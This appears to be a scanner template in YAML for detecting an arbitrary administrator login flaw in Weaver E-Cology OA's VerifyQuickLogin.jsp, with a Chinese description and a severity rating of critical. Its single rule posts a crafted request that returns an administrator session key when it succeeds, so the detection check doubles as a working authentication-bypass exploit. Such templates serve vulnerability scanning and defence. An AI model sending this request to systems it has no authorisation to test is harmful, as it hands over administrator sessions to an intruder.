expression: r0()
id: e-cology-verify-quick-login-user-login
info:
  author: zan8in
  description: "\u6CDB\u5FAEOA E-Cology VerifyQuickLogin.jsp\u6587\u4EF6\u4E2D\u5B58\
    \u5728\u4EFB\u610F\u7BA1\u7406\u5458\u767B\u5F55\u6F0F\u6D1E\uFF0C\u653B\u51FB\
    \u7740\u901A\u8FC7\u53D1\u9001\u7279\u6B8A\u7684\u8BF7\u6C42\u5305\u53EF\u4EE5\
    \u83B7\u53D6\u7BA1\u7406\u5458Session\napp=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516C\
    OA\"\n"
  name: "\u6CDB\u5FAEOA E-Cology VerifyQuickLogin.jsp \u4EFB\u610F\u7BA1\u7406\u5458\
    \u767B\u5F55\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"sessionkey":')
      && response.body.bcontains(b'"message":')
    request:
      body: identifier=1&language=1&ipaddress=x.x.x.x
      method: POST
      path: /mobile/plugin/VerifyQuickLogin.jsp
